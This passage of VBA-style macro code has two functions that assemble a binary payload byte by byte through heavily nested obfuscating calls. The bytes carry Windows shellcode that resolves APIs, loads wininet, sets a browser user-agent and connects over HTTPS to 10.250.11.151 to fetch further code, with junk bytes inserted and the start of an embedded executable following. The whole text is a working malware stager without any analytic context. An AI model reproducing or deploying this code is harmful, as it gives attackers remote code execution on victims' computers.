    strPE = A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 3), 9), 139), "B<"), 1), 208), 144), 235), 8), 247), 192), 241), 139), "y@"), 198), "A"), 139), "@x"), 144), 235), 14), 161), 245), 234), 144), 164), "r"), 142), 174), 255), 194), 136), 235), 183), "MW"), 144), 133), 192), 235), 10), "K"), 146), 128), 193), "Q"), 148)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "%"), 155), 133), 234), 15), 132), 152), 1), 0), 0), 144), 235), 10), "="), 155), 219), 30), 163), 127), "bX"), 23), 236), 1), 208), "P"), 144), 139), "X "), 139), "H"), 24), 144), 1), 211), 144), 235), 9), "F"), 239), "b"), 132), 4), 206), 166), 172), 221), 133), 201)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(strPE, 144), 235), 8), 153), 24), "TiG"), 27), "h"), 140), 15), 132), "N"), 1), 0), 0), 144), 144), 235), 11), 163), 130), 173), 150), 159), 192), 198), ")"), 249), 28), 201), "I"), 144), "1"), 255), 139), "4"), 139), 144), 235), 11), 146), 247), 31), 34), 192), 149), 199), "r")
    strPE = B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 192), "oi"), 1), 214), 144), 235), 14), "P"), 128), "A=T."), 187), 202), "0I"), 245), 0), 200), "A"), 235), 12), 139), ">"), 26), 244), 212), 214), "2"), 163), " "), 167), 213), 137), "1"), 192), 235), 15), 177), 211), "@"), 151), 159), 161), "O|"), 187), "c")
    strPE = A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 19), "*"), 139), 153), 232), 172), 144), 193), 207), 13), 1), 199), 144), "8"), 224), 15), 133), 207), 255), 255), 255), 235), 8), 217), 20), 149), 245), 203), 206), 230), 12), 144), 3), "}"), 248), 144), 235), 13), 244), 222), "\0"), 191), 20), 208), "JG"), 238), "c"), 155)
    strPE = A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(strPE, 144), ";}$"), 144), 15), 133), "R"), 255), 255), 255), 235), 11), 21), 127), "*"), 171), 148), 186), 176), 134), "("), 222), "PX"), 144), 235), 13), "5*{"), 141), 151), 168), "!"), 221), 208), "e"), 242), "$X"), 139), "X$"), 144), 1), 211), "f"), 139), 12)
    strPE = A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "K"), 144), 139), "X"), 28), 144), 233), 13), 0), 0), 0), 23), "hL"), 143), 192), 135), 7), "UftXA"), 171), 1), 211), 144), 233), 13), 0), 0), 0), 12), 233), 245), "8"), 11), 25), "T"), 193), 219), 179), 196), 253), "S"), 139), 4), 139), 144), 233)
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(strPE, 10), 0), 0), 0), "K"), 181), 168), "{hn"), 242), 230), "U"), 233), 1), 208), 144), 233), 12), 0), 0), 0), 22), 233), "55!h3qB"), 184), 142), "8"), 137), "D$$[["), 144), 233), 15), 0), 0), 0), "L"), 160), "j"), 240)
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(strPE, "]_"), 129), 201), "M"), 196), 9), 223), "sH"), 168), "a"), 144), "YZ"), 144), 233), 9), 0), 0), 0), 201), "UJ"), 151), 27), 20), 212), 209), 17), "Q"), 255), 224), 144), 233), 12), 0), 0), 0), "e"), 225), 166), "4*"), 228), "6"), 193), 247), 193), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(strPE, "#"), 144), "X"), 233), 10), 0), 0), 0), "6!"), 16), "8K"), 17), "v9"), 145), 135), 144), "_"), 144), 233), 11), 0), 0), 0), 222), 236), 0), 14), 217), "P"), 22), "P"), 133), 2), 205), "Z"), 144), 139), 18), 144), 233), 148), 253), 255), 255), 144), 144), "]")
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 233), 13), 0), 0), 0), "{"), 204), 153), "o"), 192), 11), 129), 203), 20), 160), "7"), 234), 0), 233), 9), 0), 0), 0), 12), "c&"), 250), 185), 21), 194), "m"), 158), 190), 18), 2), 0), 0), 144), 233), 13), 0), 0), 0), 3), 183), 191), 142), 20), "xA")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(strPE, 184), "A!"), 144), 174), "{"), 144), "j@h"), 0), 16), 0), 0), 144), "V"), 233), 9), 0), 0), 0), 195), "\"), 216), "=#"), 202), 10), 132), 247), "j"), 0), 144), "hX"), 164), "S"), 229), 144), 255), 213), 137), 195), 144), 137), 199), 144), 137), 241), 233)
    strPE = B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 14), 0), 0), 0), "Tf\!"), 2), 205), 24), 135), 161), "2"), 199), 206), "l"), 152), 232), "P"), 1), 0), 0), 144), 233), 8), 0), 0), 0), "4"), 23), 181), 237), 241), 15), "6"), 221), "^"), 242), 164), 233), 12), 0), 0), 0), 5), "/"), 7), "]?")
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "5"), 185), 152), 10), ":p"), 158), 232), 198), 0), 0), 0), 144), 233), 11), 0), 0), 0), "k92"), 15), 168), 236), "?"), 8), 7), "{"), 238), 144), 187), 224), 29), "*"), 10), 144), 233), 8), 0), 0), 0), 195), "O"), 16), "o?."), 150), "?h")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 166), 149), 189), 157), 144), 233), 14), 0), 0), 0), "Y:"), 223), 175), 200), "SF1"), 247), 233), "E"), 190), 214), "w"), 137), 232), 144), 233), 13), 0), 0), 0), "o"), 12), "} "), 157), 226), 183), 25), 173), 26), "dm"), 147), 255), 208), 144), 233), 11)
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(strPE, 0), 0), 0), "e"), 30), ","), 213), 137), 162), "]~3 *<"), 6), 144), 15), 140), "-"), 0), 0), 0), 128), 251), 224), 144), 233), 11), 0), 0), 0), 169), 244), "$+1"), 243), 183), 133), "o"), 171), "Q"), 15), 133), 19), 0), 0), 0), 233)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 9), 0), 0), 0), "/"), 212), 210), 236), "Z"), 160), 162), 14), "2"), 187), "G"), 19), "ro"), 144), "j"), 0), 144), 233), 15), 0), 0), 0), 30), 194), 130), 177), 23), 2), "%"), 239), 156), 151), 211), 175), ",)US"), 255), 213), 144), 233), 9), 0), 0)
    strPE = B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 0), 145), 145), "D"), 152), 193), 192), 11), "-4"), 233), 13), 0), 0), 0), 203), 167), 178), "}"), 26), 24), 234), 191), 255), "u"), 10), ">"), 23), "1"), 192), 144), 233), 11), 0), 0), 0), "@"), 182), 147), 136), 0), 202), "kq"), 140), 197), 184), "d"), 255), "0")
    strPE = B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 233), 8), 0), 0), 0), 162), 157), 12), "h"), 7), 27), "x"), 24), "d"), 137), " "), 233), 12), 0), 0), 0), "TR"), 28), "R"), 24), 238), 253), "g"), 202), 18), 196), 238), 255), 211), 233), 14), 0), 0), 0), 245), 164), "S"), 185), "("), 9), 173), "@"), 215), "h")
    strPE = B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "v"), 131), 227), 183), 233), 215), 254), 255), 255), 232), 172), 254), 255), 255), 252), 232), 143), 0), 0), 0), "`1"), 210), 137), 229), "d"), 139), "R0"), 139), "R"), 12), 139), "R"), 20), "1"), 255), 139), "r("), 15), 183), "J&1"), 192), 172), "<a|")
    strPE = A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(strPE, 2), ", "), 193), 207), 13), 1), 199), "Iu"), 239), "RW"), 139), "R"), 16), 139), "B<"), 1), 208), 139), "@x"), 133), 192), "tL"), 1), 208), 139), "X "), 1), 211), "P"), 139), "H"), 24), 133), 201), "t<1"), 255), "I"), 139), "4"), 139), 1)
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 214), "1"), 192), 193), 207), 13), 172), 1), 199), "8"), 224), "u"), 244), 3), "}"), 248), ";}$u"), 224), "X"), 139), "X$"), 1), 211), "f"), 139), 12), "K"), 139), "X"), 28), 1), 211), 139), 4), 139), 1), 208), 137), "D$$[[aYZ")
    strPE = B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(strPE, "Q"), 255), 224), "X_Z"), 139), 18), 233), 128), 255), 255), 255), "]hnet"), 0), "hwiniThLw&"), 7), 255), 213), "1"), 219), "SSSSS"), 232), ">"), 0), 0), 0), "Mozill")
    strPE = B(strPE, "a/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like ")
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(strPE, "Gecko"), 0), "h:Vy"), 167), 255), 213), "SSj"), 3), "SSh"), 187), 1), 0), 0), 232), 235), 0), 0), 0), "/bi09dUkS7GWzQLJB08GI")
    strPE = B(strPE, "hg92LP8-iarEFclxSLo8GyLz0XQ24GdQB1L13Gfirq1gWLTJs5")
    strPE = A(A(A(A(A(A(B(A(B(strPE, "wqzoJt6kcUhAF0J9Njyr_ryWhB24yqoF6sygeBs4"), 0), "PhW"), 137), 159), 198), 255), 213), 137)

    PE2 = strPE
End Function

Private Function PE3() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(strPE, 198), "Sh"), 0), 2), "h"), 132), "SSSWSVh"), 235), "U.;"), 255), 213), 150), "j"), 10), "_SSSSVh-"), 6), 24), "{"), 255), 213), 133), 192), "u"), 20), "h"), 136), 19), 0), 0), "hD"), 240), "5"), 224)
    strPE = A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 255), 213), "Ou"), 225), 232), "J"), 0), 0), 0), "j@h"), 0), 16), 0), 0), "h"), 0), 0), "@"), 0), "ShX"), 164), "S"), 229), 255), 213), 147), "SS"), 137), 231), "Wh"), 0), " "), 0), 0), "SVh"), 18), 150), 137), 226), 255), 213)
    strPE = B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 133), 192), "t"), 207), 139), 7), 1), 195), 133), 192), "u"), 229), "X"), 195), "_"), 232), 127), 255), 255), 255), "10.250.11.151"), 0), 187), 240), 181), 162), "Vj"), 0), "S"), 255), 213), 0), 131), 7), 4), 131), "~")
    strPE = A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "g"), 3), "+I"), 139), "?"), 4), 184), 1), 0), 0), 186), 137), 198), 216), "f"), 137), "E"), 220), "5"), 248), 23), "A"), 0), 141), "U"), 212), "RP"), 137), "M"), 224), 137), "u"), 228), 232), "LC"), 0), 0), 235), "#"), 139), "="), 184), 229), "A"), 0), 139), 21)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 204), 2), "A"), 0), "GB"), 137), "="), 184), 148), "A"), 0), 137), 21), 204), 2), "A"), 0), 146), 232), 202), 26), 0), 0), "b"), 196), 4), 139), "E"), 244), 139), "U"), 248), 139), "4"), 252), "@"), 131), 194), 20), "|"), 193), 137), "Z"), 244), 137), "#"), 248), 15), 140)
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(strPE, 168), 254), "W"), 255), 139), 13), 149), 34), "A"), 0), 139), "E"), 240), ";\"), 161), 172), 2), "A"), 176), 203), 27), "|"), 13), 139), 21), 160), "cp"), 0), 139), "M"), 236), 219), 209), "s"), 12), ";H"), 16), 208), "@"), 0), 15), 140), 18), 254), 255), 255), 139)
    strPE = A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(strPE, 13), 20), 208), "@"), 0), 133), 201), "t"), 26), "P"), 161), "V"), 192), "@"), 0), 131), 192), "@h"), 213), 210), "@"), 0), "P"), 255), 21), 128), 193), "@"), 0), 131), 230), 12), 223), 14), "hx;@"), 0), 255), 21), "d"), 193), "@"), 0), 131), 196), 208), 220)
    strPE = B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 136), 168), "A"), 132), 133), 192), "tp"), 232), 223), 6), 0), 0), "_"), 193), "["), 139), 229), "]"), 195), "j"), 0), 232), "1"), 2), 0), 0), 131), 196), 172), "_^["), 139), "t]"), 157), 144), 144), 144), 144), "H"), 144), 144), 196), 139), 208), 131), 236), "x")
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(strPE, "V"), 139), "u"), 19), 155), 141), "E"), 136), "jxPV("), 137), "hX"), 0), 147), 165), 8), 139), 21), 200), 192), "@"), 0), "P"), 18), 131), 194), "@$"), 172), 212), "@QR"), 255), 21), 128), 193), "@"), 0), 161), 172), "+A"), 0), 131), 196)
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(strPE, 20), 133), 192), "t"), 15), "PhT"), 210), "@"), 0), "Q"), 21), "d"), 193), "@"), 0), 131), 31), 8), "V"), 255), 21), "pS@"), 0), "^"), 144), 202), 144), 144), 144), 144), 198), 144), 144), 144), 144), 144), 189), "H"), 236), "y"), 236), 20), "SV"), 139), 163)
    strPE = B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(strPE, 8), "W"), 139), 243), 20), 174), "E"), 8), 232), "IK"), 0), 0), 163), 160), 11), "A"), 0), 137), "-"), 164), 11), "l"), 0), 139), 148), 139), "F"), 20), 133), 192), 139), 250), "u"), 24), 139), "N"), 199), "j"), 0), "@"), 0), "Q"), 247), 150), "m"), 0), "$"), 137), "9")
    strPE = A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(strPE, "8"), 8), 0), 0), 200), 190), "<"), 220), 0), 0), 199), "FM"), 0), 0), 0), 0), 139), 222), 236), 23), "A"), 0), 137), "V"), 20), 161), "r"), 2), "A"), 0), 133), 230), "t&"), 230), ">"), 188), "Aw"), 253), 202), 212), 188), 231), "C"), 20), "V"), 31), 217)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(strPE, 142), "8"), 14), 0), 0), 161), "("), 174), "@T"), 228), 231), ","), 208), "@"), 0), "j"), 200), 139), 134), "<"), 8), 0), 0), 19), 194), ";"), 248), 15), 143), 229), 0), 0), 0), "|"), 209), ";"), 217), 15), 135), 219), 0), 0), 0), 139), "VL"), 139), 29), 217)
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 208), "@"), 0), 213), 192), 4), "mM"), 161), 3), 211), "eRP"), 232), "mk"), 0), 0), 133), 13), "t3"), 131), 248), 11), "t.=h"), 142), 10), 30), "t'="), 217), 252), 10), 0), "t ="), 1), 253), 10), 168), "t"), 25), "=")
    strPE = A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "$"), 253), 10), 0), "t"), 18), 227), 187), 252), 10), 0), "t"), 11), 231), 179), "#"), 11), 0), 15), 133), 148), "|"), 0), 0), 139), "E?"), 139), 29), 160), 2), "A"), 0), 139), "="), 164), 2), "A"), 0), 143), 216), 131), "B"), 0), 137), "N/"), 13), "A"), 0)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 135), "="), 164), 2), "A"), 0), 139), "V"), 24), 139), "N"), 20), "k"), 208), 165), 248), 137), "V"), 24), 137), "N"), 20), 15), 242), 236), 254), 255), 255), 199), 25), 196), 3), 15), 0), 0), 232), "4J"), 0), 0), 163), 160), 11), " "), 0), 137), "^"), 164), 11), "A")
    strPE = B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 139), 147), 15), 141), 134), "z"), 8), 245), 0), 139), 13), 164), 11), 0), 0), 184), 127), 0), 0), 0), "'E"), 240), "f"), 137), "E"), 244), 137), 138), "D"), 8), 0), 0), 139), 135), 248), 23), "A"), 0), 141), "E"), 236), "8U"), 163), "Pe"), 137), "u")
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(strPE, 252), 232), 178), 164), 0), 0), "_^["), 139), 229), "]"), 210), "h"), 212), 5), "@"), 0), 253), 21), "d"), 193), "@hV"), 232), "jy"), 0), 0), 22), 196), 8), "=^["), 202), 229), "]"), 195), 139), 29), 188), 2), "Anh"), 188), 212), "@")
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 0), "C"), 137), 29), 188), 2), "A"), 0), 255), 21), 183), 193), "@"), 0), "V"), 0), "B"), 26), 0), 0), 131), 196), 8), "_^[e"), 229), "]"), 154), 144), 144), 144), 144), 247), 198), 144), 146), 157), 139), 7), 129), 236), 188), 0), 0), 0), 139), "E"), 8)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "M"), 192), 203), "("), 232), 156), 254), 0), 0), 163), 160), 11), "A"), 0), 137), 21), 164), 11), "A"), 0), 235), 11), 139), 21), "t"), 11), 250), 0), 161), 160), 11), "A"), 0), "S"), 139), 29), 192), 11), "A"), 0), "VW"), 139), "="), 196), "gA"), 180), "{"), 195)
    strPE = A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(strPE, 27), 215), 137), "E"), 216), 137), "U"), 220), 139), "5$"), 193), "@"), 0), 223), "m"), 216), "u3"), 223), "%"), 0), 220), 13), "8"), 194), "@3"), 176), "]"), 180), 255), 215), 249), 224), "pA"), 0), "h"), 152), 223), "@"), 245), 255), 214), 161), 0), "IA"), 0)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(strPE, 248), "h|"), 223), "@"), 0), 255), 214), "3"), 217), "f"), 139), "J"), 244), 23), 207), 0), "Qh\"), 223), "@"), 0), 255), 214), 2), 128), 212), "@^"), 138), 214), 209), 21), 231), 23), "A"), 0), "Rh"), 207), 239), "@"), 215), 17), 214), 161), 140), 2), "A")
    strPE = B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 0), 190), "h"), 214), 223), "@"), 0), 255), 214), "h"), 128), 212), 22), 185), 255), "M"), 206), 13), 24), 208), "@"), 248), 168), 155), 0), 223), "V"), 0), 255), "l"), 139), 183), 212), 205), 9), 208), 128), "dh"), 216), 131), "@"), 0), 255), 214), 139), 13), 172), 2), "A")
    strPE = A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 0), 131), 196), "HMh"), 188), 145), "@"), 0), 255), 214), 139), 21), 184), 157), "A"), 151), "Rh"), 160), 222), "@"), 0), 255), 158), 161), 184), 2), "A"), 0), 131), 196), 16), 133), 192), "t$"), 161), 204), 26), 27), 0), "z"), 13), 192), "=A"), 0), 139)
    strPE = A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(strPE, 21), 190), 2), "A"), 0), 25), 161), "s"), 2), "A"), 0), "Q\P+d"), 222), 175), 0), 255), 214), 131), 223), 20), 139), 13), "l"), 2), "A"), 0), "]h"), 170), 199), "@"), 0), 255), "x"), 161), 27), 2), "A"), 144), 131), 196), 8), 133), "gt"), 11)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(strPE, "Php"), 222), 17), 0), 3), 196), 131), 230), 8), 161), "h"), 2), 179), 0), 251), 192), "t"), 17), 139), "t"), 176), "z"), 176), 0), "Rh"), 16), 222), "@"), 220), "("), 214), 131), 196), 8), 161), 148), 2), 149), 0), 139), 13), 144), 2), 230), 0), "PR")
    strPE = A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "h"), 232), 221), "@"), 0), 255), 214), 15), "`"), 2), 243), 0), 239), 196), 12), 131), 248), 1), "u"), 23), 139), 21), 164), 2), 151), 0), 161), "I"), 239), "4"), 0), "RPm"), 131), 221), "@H"), 255), 214), 131), "u"), 12), 131), "=`"), 2), "A|"), 2)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "u"), 24), 139), 13), 164), 2), "A"), 0), 139), 21), 160), 2), 157), 0), "QR"), 230), 168), 246), "@"), 0), "B"), 21), 131), 196), 12), 161), 156), 2), "A "), 139), "W"), 152), 2), "A"), 0), 154), "Qh"), 128), 221), 1), 0), 255), 214), 221), 5), 208), 220)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(strPE, 29), "0"), 194), 22), 0), 131), "K"), 12), 223), 192), 246), "8D"), 15), "="), 238), 0), 0), 0), 161), 172), 2), "A"), 11), 133), 192), 15), 132), "w"), 14), 0), 0), 169), 170), "*"), 194), "@"), 5), 220), "u"), 208), 131), 236), 172), 151), "]1"), 219), 5), 172)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(strPE, 2), 150), 0), 220), "M"), 128), 221), 28), "$hP"), 221), "@"), 0), 255), 214), 219), 5), 24), 31), "c"), 0), 131), 196), 4), 220), "M"), 208), 220), 13), " "), 194), "@"), 0), 218), "5"), 172), 2), 228), 0), 221), 28), "$h$"), 221), 156), 0), 11), 214)
    strPE = B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 221), "E"), 31), 220), 29), " "), 194), 179), 0), "M"), 196), 4), 218), "<"), 172), 2), "A"), 249), 151), 28), "$h"), 216), "Z@"), 225), 253), 214), 143), "-"), 144), 2), "A"), 0), 131), 196), 12), 220), "M"), 128), 220), 13), 24), 194), "@"), 0), "{"), 170), "$h")
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(strPE, 164), 220), "l"), 0), 255), 214), 170), "`"), 2), "A"), 0), 131), 196), 12), 133), 192), "~YT-"), 160), 154), "A"), 22), 131), 236), 8), 220), "M"), 128), 167), 13), 24), 173), 11), 0), 221), 28), 254), "h|"), 220), "@"), 0), 255), 214), 139), 21), 160), 2)
    strPE = A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(strPE, 221), 0), 139), 29), 144), "AA"), 185), 174), 164), 2), "A"), 0), 139), 164), 148), 2), "A\"), 3), 211), 19), 199), 137), "U|"), 137), "E"), 220), 131), 196), 178), 16), "m"), 239), 220), "M"), 1), 220), 13), 24), 194), "@6"), 221), 28), "$h"), 144), 220)
    strPE = A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(strPE, "@"), 155), 255), 214), 131), 196), 12), 161), 172), 2), "A"), 0), 133), 192), 15), 142), 137), "="), 143), 0), "3"), 201), 131), 207), 255), 186), "~"), 255), 255), 127), ";~"), 137), 250), 192), 137), "M)"), 137), "M"), 200), 137), "M"), 161), 137), "&"), 224), 137), "M"), 228)
    strPE = A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 137), "M"), 232), 137), "M"), 236), 25), "}"), 176), 137), "U"), 180), "5}"), 160), 3), 161), 138), 222), 189), "`"), 255), 255), 255), 137), 149), "d:"), 255), 255), 137), "}"), 208), 137), "U"), 212), 137), 141), "p"), 240), 255), "X"), 137), 141), "t"), 255), 255), "x"), 137), 197)
